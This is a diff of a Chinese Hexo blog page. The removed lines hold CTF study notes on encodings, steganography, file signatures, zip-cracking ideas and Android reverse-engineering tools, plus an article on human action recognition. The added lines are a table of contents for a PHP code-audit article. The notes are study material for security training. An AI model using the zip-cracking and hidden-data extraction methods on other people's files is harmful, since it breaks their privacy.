-<li><a href="http://www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html(介绍CTF编码的文章)" target="_blank" rel="noopener">www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html(介绍CTF编码的文章)</a></li>
-</ul>
-<h4 id="图形码"><a href="#图形码" class="headerlink" title="图形码"></a>图形码</h4><p>条形码,二维码。</p>
-<h4 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted printable"></a>Quoted printable</h4><p>用等号隔开</p>
-<h4 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h4><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
-<h4 id="JSfuck"><a href="#JSfuck" class="headerlink" title="JSfuck"></a>JSfuck</h4><p><a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a><br>可以直接扔到浏览器里运行</p>
-<p>####代码混淆<br>明显，在线解码</p>
-<h4 id="工具小结"><a href="#工具小结" class="headerlink" title="工具小结"></a>工具小结</h4><p><a href="http://tool.ph0en1x.com/hashtool/tools.html#conv" target="_blank" rel="noopener">http://tool.ph0en1x.com/hashtool/tools.html#conv</a><br>JPK<br>CTFCrack</p>
-<h2 id="Forensic-amp-Stego"><a href="#Forensic-amp-Stego" class="headerlink" title="Forensic &amp; Stego"></a>Forensic &amp; Stego</h2><ul>
-<li>取证对象：各种数据包PCAP,图像，音频，压缩包，磁盘，内存镜像，PDF,word</li>
-<li>目的：发现文件隐藏的字符串，通常有文件的修复,字符串常常又与隐写加密结合在一起</li>
-<li>&lt;&lt;黑客大追踪&gt;&gt;</li>
-<li>熟悉常用文件的文件头。</li>
-</ul>
-<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><ul>
-<li>file</li>
-<li>strings</li>
-<li>diff</li>
-<li>binwalk,foremost<ul>
-<li>binwalk -e<br>拓展提高：<a href="http://www.freebuf.com/sectool/15266.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/15266.html</a></li>
-</ul>
-</li>
-<li>010ditor<br>分析文件16进制,强大的模板功能</li>
-</ul>
-<h3 id="图片："><a href="#图片：" class="headerlink" title="图片："></a>图片：</h3><h4 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h4><p>特征：以 FF D8 开头，以 FF D9 结尾。<br>格式：标记码+压缩数据<br>标记码： 由两个字节构成，第一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值<br>压缩数据：前两个字节保存整个段的长度，包括这两个字节<br>隐写方式：利用文件格式隐藏信息，插入法</p>
-<ul>
-<li>文件尾部插入<br>储存在APP1数据区中<br>工具：MagicEXIF</li>
-<li>每段开始前<br>COM注释：<br>FF 开始标记<br>FE COM注释标记符<br>00 02 总长度 11 内容<br>工具:stegdetect 检测隐写工具</li>
-</ul>
-<h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><p>特征：以89 50 4E 47 开头。<br>格式:PNG文件署名域+标准数据块(+辅助数据块)<br>隐写方式:</p>
-<ul>
-<li><p>IDAT 隐藏数据:PNG图片中可以存在多个IDAT块 因此这也成了一个隐写的途径</p>
-</li>
-<li><p>修改PNG图片的高度,隐藏数据</p>
-</li>
-<li><p>双图</p>
-<p>​</p>
-<p>工具:pngcheck</p>
-<p>​</p>
-<p>#####pngcheck</p>
-<h5 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a>LSB隐写</h5><p>stegsolve:必备</p>
-<p>​</p>
-<p>位平面对图像的影响不一样，可以隐写到不是很重要的位平面。</p>
-</li>
-</ul>
-<h4 id="BMP-文件格式"><a href="#BMP-文件格式" class="headerlink" title="BMP 文件格式"></a>BMP 文件格式</h4><p>特征是以 50 4B 03 04 开头，有时也会出现 50 4B 05 06 和 50 4B 07 08 的情况。</p>
-<h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>特征：以 GIF89a 或 GIF87a 开头。</p>
-<ul>
-<li>文件格式</li>
-<li>空间</li>
-<li>时间轴 identity命令 //、linux上的identify命令主要用于获取一个或多个图像文件的格式和特性。</li>
-<li>思路：</li>
-</ul>
-<h3 id="压缩文件："><a href="#压缩文件：" class="headerlink" title="压缩文件："></a>压缩文件：</h3><h4 id="zip文件格式"><a href="#zip文件格式" class="headerlink" title="zip文件格式"></a>zip文件格式</h4><ul>
-<li>压缩源文件数据区<br>• 文件头 ： PK开头<br>• 文件数据<br>• （数据描述符）</li>
-<li>思路：<ul>
-<li>文件格式</li>
-<li>CRC32爆破：有时候加密的文件很小，直接枚举数据的CRC32值，如果相同，就相当于知道了文件的内容</li>
-<li>伪加密</li>
-<li>已知明文攻击</li>
-</ul>
-</li>
-<li>目录结束标识</li>
-</ul>
-<h4 id="RAR-文件"><a href="#RAR-文件" class="headerlink" title="RAR 文件"></a>RAR 文件</h4><p>特征：以以 Rar! 开头。</p>
-<h3 id="流量分析-重要"><a href="#流量分析-重要" class="headerlink" title="流量分析(重要)"></a>流量分析(重要)</h3><ul>
-<li><p>文件修复</p>
-</li>
-<li><p>协议分析<br>• 总体把握（整体分析）</p>
-<ul>
-<li><p>协议分级</p>
-</li>
-<li><p>端点统计</p>
-<p>• 过滤赛选</p>
-</li>
-<li><p>过滤语法</p>
-</li>
-<li><p>Host，Protocol，contains，特征值</p>
-<p>• 发现异常</p>
-</li>
-<li><p>特殊字符串</p>
-</li>
-<li><p>协议某字段</p>
-<p>• 数据提取</p>
-</li>
-<li><p>字符串取</p>
-</li>
-<li><p>文件提取</p>
-</li>
-</ul>
-</li>
-<li><p>数据提取</p>
-<ul>
-<li>Wireshark</li>
-<li>Pcapfix //修复数据包</li>
-<li>Dshell(强大)</li>
-<li>tshark（wireshark命令行版本）<br>命令:1. tr，2.xxd</li>
-</ul>
-</li>
-</ul>
-<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="音频文件"><a href="#音频文件" class="headerlink" title="音频文件"></a>音频文件</h4><ul>
-<li>频谱<br>有可能是在高频上，需要进行拉伸。(Rctf 2017)</li>
-<li>波形</li>
-<li>隐写软件：MP3Stego,Slienteye</li>
-</ul>
-<h4 id="视频类"><a href="#视频类" class="headerlink" title="视频类"></a>视频类</h4><p>AVI，MP4较为常见</p>
-<ul>
-<li>工具：<ul>
-<li>Ffmpeg：BCTF2016-catvideo</li>
-<li>Ourstrect</li>
-</ul>
-</li>
-</ul>
-<h4 id="HTML隐写"><a href="#HTML隐写" class="headerlink" title="HTML隐写"></a>HTML隐写</h4><p>Snow.exe：通过插入制表位与空格使得嵌入的数据在浏览器中不可见<br><a href="http://fog.misty.com/perry/ccs/snow/snow/" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/</a></p>
-<h4 id="PYC文件类"><a href="#PYC文件类" class="headerlink" title="PYC文件类"></a>PYC文件类</h4><p>字节码修复,隐写，逆向分析。</p>
-<ul>
-<li>Tools<ul>
-<li>pycdc</li>
-<li>uncompyle</li>
-<li><a href="http://unpyc.sourceforge.net/Opcodes.html/" target="_blank" rel="noopener">http://unpyc.sourceforge.net/Opcodes.html\</a></li>
-<li>Stegosaurus 隐写</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3.6 stegosaurus.py  5061c764-2ac4-4386-afd0-2f7a69139efa.pyc -x</span><br><span class="line">Extracted payload: Flag&#123;HiD3_Pal0ad_1n_Python&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.freebuf.com/sectool/129357.html</span><br></pre></td></tr></table></figure>
-<h3 id="固件分析类（国内少）"><a href="#固件分析类（国内少）" class="headerlink" title="固件分析类（国内少）"></a>固件分析类（国内少）</h3><h4 id="Pro类"><a href="#Pro类" class="headerlink" title="Pro类"></a>Pro类</h4><ul>
-<li>Python模拟输入</li>
-<li>爆破</li>
-<li>算法</li>
-</ul>
-<h2 id="安卓逆向分析"><a href="#安卓逆向分析" class="headerlink" title="安卓逆向分析"></a>安卓逆向分析</h2><p>调试:</p>
-<ul>
-<li>IDA Pro</li>
-<li>GDB</li>
-</ul>
-<p>-angr<br>Hook:</p>
-<ul>
-<li>Xposed</li>
-<li>Frida（important）</li>
-</ul>
-<p>java层：</p>
-<ul>
-<li>java-&gt;jvm字节码-&gt;dalvik字节码(javac,dx)</li>
-<li>dex-&gt;smali(baksmaili)</li>
-<li>dex-&gt;smali,伪java(jeb)</li>
-<li>dex-&gt;java字节码(dex2jar)</li>
-<li>java字节码-&gt;伪java(jd-gui)</li>
-</ul>
-<p>native层:<br>IDA</p>
-<h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>C/C++源码<br>混淆工具</p>
-<ul>
-<li>LLVM-Obfuscator</li>
-<li>CXX-Obfuscator</li>
-</ul>
-<p>混淆技术</p>
-<ul>
-<li>指令替换</li>
-<li>伪造控制流</li>
-<li>扁平化控制流</li>
-</ul>
-<h3 id="隐藏与取证"><a href="#隐藏与取证" class="headerlink" title="隐藏与取证"></a>隐藏与取证</h3><h3 id="Rootkit"><a href="#Rootkit" class="headerlink" title="Rootkit"></a>Rootkit</h3><h3 id="取证技术"><a href="#取证技术" class="headerlink" title="取证技术"></a>取证技术</h3>
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-
-    </footer>
-  </div>
   
 </article>
 
 <!-- Table of Contents -->
 
-  
-    <article id="post-行为识别"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
     
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-代码审计-知识点"><span class="nav-number">1.</span> <span class="nav-text">PHP 代码审计_知识点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-XSS"><span class="nav-number">1.1.</span> <span class="nav-text">1.XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1反射型XSS"><span class="nav-number">1.1.1.</span> <span class="nav-text">1.1反射型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#修复建议："><span class="nav-number">1.1.1.2.1.</span> <span class="nav-text">-  修复建议：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2存储型XSS"><span class="nav-number">1.1.2.</span> <span class="nav-text">1.2存储型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-1"><span class="nav-number">1.1.2.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-DOM-XSS"><span class="nav-number">1.1.3.</span> <span class="nav-text">1.3 DOM XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-2"><span class="nav-number">1.1.3.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-2"><span class="nav-number">1.1.3.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-文件漏洞"><span class="nav-number">1.2.</span> <span class="nav-text">1.文件漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1文件读取漏洞"><span class="nav-number">1.2.1.</span> <span class="nav-text">2.1文件读取漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-3"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-3"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2文件上传漏洞"><span class="nav-number">1.2.2.</span> <span class="nav-text">2.2文件上传漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-4"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4文件删除漏洞"><span class="nav-number">1.2.3.</span> <span class="nav-text">2.4文件删除漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-5"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-4"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1文件包含漏洞"><span class="nav-number">1.2.4.</span> <span class="nav-text">3.1文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-6"><span class="nav-number">1.2.4.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-preg-replace漏洞"><span class="nav-number">1.2.5.</span> <span class="nav-text">3.2 preg_replace漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-7"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-5"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3回调漏洞"><span class="nav-number">1.2.6.</span> <span class="nav-text">3.3回调漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-8"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#建议修复代码："><span class="nav-number">1.2.6.2.</span> <span class="nav-text">建议修复代码：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1命令执行漏洞"><span class="nav-number">1.2.7.</span> <span class="nav-text">4.1命令执行漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-9"><span class="nav-number">1.2.7.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-6"><span class="nav-number">1.2.7.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1普通注入漏洞"><span class="nav-number">1.2.8.</span> <span class="nav-text">5.1普通注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-10"><span class="nav-number">1.2.8.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#修复建议：-1"><span class="nav-number">1.2.8.2.</span> <span class="nav-text">修复建议：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2宽字节注入漏洞"><span class="nav-number">1.2.9.</span> <span class="nav-text">5.2宽字节注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-11"><span class="nav-number">1.2.9.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-7"><span class="nav-number">1.2.9.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3字符集漏洞"><span class="nav-number">1.2.10.</span> <span class="nav-text">5.3字符集漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-12"><span class="nav-number">1.2.10.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-1-hash比较绕过"><span class="nav-number">1.2.11.</span> <span class="nav-text">6.1 hash比较绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-13"><span class="nav-number">1.2.11.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-json绕过"><span class="nav-number">1.2.12.</span> <span class="nav-text">6.2 json绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-14"><span class="nav-number">1.2.12.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-8"><span class="nav-number">1.2.12.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-array-search绕过"><span class="nav-number">1.2.13.</span> <span class="nav-text">6.3 array_search绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-15"><span class="nav-number">1.2.13.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-9"><span class="nav-number">1.2.13.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-strcmp绕过"><span class="nav-number">1.2.14.</span> <span class="nav-text">6.4 strcmp绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-16"><span class="nav-number">1.2.14.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-10"><span class="nav-number">1.2.14.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1变量覆盖漏洞"><span class="nav-number">1.2.15.</span> <span class="nav-text">7.1变量覆盖漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-17"><span class="nav-number">1.2.15.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-11"><span class="nav-number">1.2.15.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-IP伪造漏洞"><span class="nav-number">1.2.16.</span> <span class="nav-text">7.2 IP伪造漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-18"><span class="nav-number">1.2.16.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-12"><span class="nav-number">1.2.16.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3编码绕过"><span class="nav-number">1.2.17.</span> <span class="nav-text">7.3编码绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-19"><span class="nav-number">1.2.17.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-13"><span class="nav-number">1.2.17.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4反序列化漏洞"><span class="nav-number">1.2.18.</span> <span class="nav-text">7.4反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-20"><span class="nav-number">1.2.18.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-14"><span class="nav-number">1.2.18.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-5截断漏洞"><span class="nav-number">1.2.19.</span> <span class="nav-text">7.5截断漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-21"><span class="nav-number">1.2.19.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-15"><span class="nav-number">1.2.19.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-6-hash长度扩展攻击漏洞"><span class="nav-number">1.2.20.</span> <span class="nav-text">7.6 hash长度扩展攻击漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-22"><span class="nav-number">1.2.20.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-16"><span class="nav-number">1.2.20.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-7-CSRF跨站请求伪造漏洞"><span class="nav-number">1.2.21.</span> <span class="nav-text">7.7 CSRF跨站请求伪造漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-23"><span class="nav-number">1.2.21.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-17"><span class="nav-number">1.2.21.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-8-SSRF请求伪造漏洞"><span class="nav-number">1.2.22.</span> <span class="nav-text">7.8 SSRF请求伪造漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-24"><span class="nav-number">1.2.22.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-18"><span class="nav-number">1.2.22.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-9伪随机数漏洞"><span class="nav-number">1.2.23.</span> <span class="nav-text">7.9伪随机数漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-25"><span class="nav-number">1.2.23.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-19"><span class="nav-number">1.2.23.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-10-XXE漏洞"><span class="nav-number">1.2.24.</span> <span class="nav-text">7.10 XXE漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01漏洞背景-26"><span class="nav-number">1.2.24.1.</span> <span class="nav-text">0x01漏洞背景</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02漏洞代码及分析-20"><span class="nav-number">1.2.24.2.</span> <span class="nav-text">0x02漏洞代码及分析</span></a></li></ol></li></ol></li></ol></li></ol>
     
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/08/05/行为识别/">人体行为识别</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/08/05/行为识别/" class="article-date">
-	  <time datetime="2017-08-05T15:53:56.000Z" itemprop="datePublished">2017-08-05</time>
-	</a>
-
-      
-      
     </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="人体行为识别"><a href="#人体行为识别" class="headerlink" title="人体行为识别"></a>人体行为识别</h1><p>空间复杂度，时间复杂度。</p>
-<p>1）将人体动作行为识别划分为几个相互联系的子过程， 根据过程划分方式的不同对相应技术进行分析分类;</p>
-<p>2) 典型问题方式，即选取人体动作行为识别中的部分典型问题作为对象，针对这些对象研究中涉及的方法进行分析<br>分类;<br>3) 空间时域方式， 即根据时域和空间上各项<br>研究方法的差别对相应技术进行分析分类．  </p>
-<h2 id="传统行为识别"><a href="#传统行为识别" class="headerlink" title="传统行为识别"></a>传统行为识别</h2><p>运动目标检测：</p>
-<ol>
-<li>图像分割</li>
-</ol>
-<ul>
-<li>基于区域的方法，基于边界的方法和数学形态学方法。其中， 基于区域的方法又分为阈值分割法，区域生长法和区域分裂合并法。</li>
-</ul>
-<ol start="2">
-<li>人体动作识别研究对于人体区进行分割</li>
-</ol>
-<ul>
-<li>直接利用或结合图像分割法对于人体区域分割</li>
-<li>构建人体模型–》结合图像分割方法通过人体区域进行分割</li>
-</ul>
-<h2 id="动作分割"><a href="#动作分割" class="headerlink" title="动作分割"></a>动作分割</h2><p> 局部分割法选取部分动作序列作为分析目标或<br>提取局部特征以实现整个行为的分割． 边界检测法<br>是一种常用而经典的局部动作分割方法。</p>
-<p>人体动作数据库</p>
-<h2 id="动作特征提取"><a href="#动作特征提取" class="headerlink" title="动作特征提取"></a>动作特征提取</h2><ol>
-<li><p>第一种是基于<strong>图像局部特征检测</strong>的方法。<br>例如有些学者使用方向梯度直方图<br>或尺度不变检测子来提取视频中的<strong>形状信息</strong>， 并 用 光 流 直 方 图（ ＨＯＦ） 或 运 动边界直 方 图 （ ＭＢＨ） 特 征 提 取 视 频 中 的 运动信息，然后用词包的形式进行编码， 并 训 练 分<br>类器识别人体行为。然而这种获取行为识别特<br>征的方法是将视频图像中提取的局部特征通过手<br>工制造得到高维的特征， 因此针对性较强， 通用性<br>较差。</p>
-</li>
-<li><p>有一些学者通过<strong>构建多级体系结构分级 </strong>进 行 行 为 识 别， 例 如 有 些 算 法 采 用 第一级结构对视频进行多种时空分割并得到所有可能的包含人体区域的分割结果， 再在第二级中利用时空信息对分割结果进行推理， 从而获得有效的人体行为特征。虽然这种分层级的方法能够更好地融合时间与空间信息， 但在每个层级中的处<br>理仍然依赖于手工制造的特征</p>
-</li>
-</ol>
-<ol start="3">
-<li>有一些学 者 提 出 使 用 <strong>深 度 神 经 网 络 进 行 行 为 识别</strong>，例 如 有 学 者 提 出 使 用 卷 积 神 经 网 络<strong>获取视频的表观特征与运动特征并将得到的特征进行分 析 与融 合</strong>，从 而 获 得 有 效的 行 为 识 别 特征。</li>
-</ol>
-<p>传统的方式      <strong>模板匹配</strong>  <strong>状态空间法</strong><br>法<br>特征提取和分类这两个步骤完成:</p>
-<ul>
-<li>首先是进行特征提取，常见的<br>特征包括 LBP ( Local Binary Patterns) ， SIFT ( Scale-Invariant<br>Feature Transform) 和 HOG( Histogram of Oriented Gradients)<br>等;</li>
-<li>分类则采用 SVM( Support Vector Machine) 和贝叶斯等机<br>器学习中常用的分类器． </li>
-</ul>
-<h2 id="行为识别–机器学习"><a href="#行为识别–机器学习" class="headerlink" title="行为识别–机器学习"></a>行为识别–机器学习</h2><p>参考：<a href="http://blog.sina.com.cn/s/blog_4caedc7a0102wrkz.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_4caedc7a0102wrkz.html</a></p>
-<p>人体特征值提取: 人体骨架—人体关键点(Skeleton) </p>
-<ol>
-<li>通过RGB图像进行关节点估计（Pose Estimation）获得。</li>
-<li>是通过深度摄像机直接获得（例如Kinect）。每一时刻（帧）骨架对应人体的K个关节点所在的坐标位置信息，一个时间序列由若干帧组成。行为识别就是对时域预先分割好的序列判定其所属行为动作的类型，即“读懂行为”。但在现实应用中更容易遇到的情况是序列尚未在时域分割（Untrimmed），因此需要同时对行为动作进行时域定位（分割）和类型判定，这类任务一般称为行为检测。</li>
-<li>主要问题：一方面是如何设计鲁棒和有强判别性的特征，另一方面是如何利用时域相关性来对行为动作的动态变化进行建模。</li>
-<li></li>
-</ol>
-<p>LSTM（Long-Short Term Memory）和循环神经系统（RNN）来搭建基础框架。</p>
-<p>基于 ＣＮＮ 的时空轨迹特征提取方法</p>
-<p>基于骨架序列的行为识别      </p>
-<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p><a href="http://blog.csdn.net/qq_36165459/article/details/78332172" target="_blank" rel="noopener">http://blog.csdn.net/qq_36165459/article/details/78332172</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/机器学习/">机器学习</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
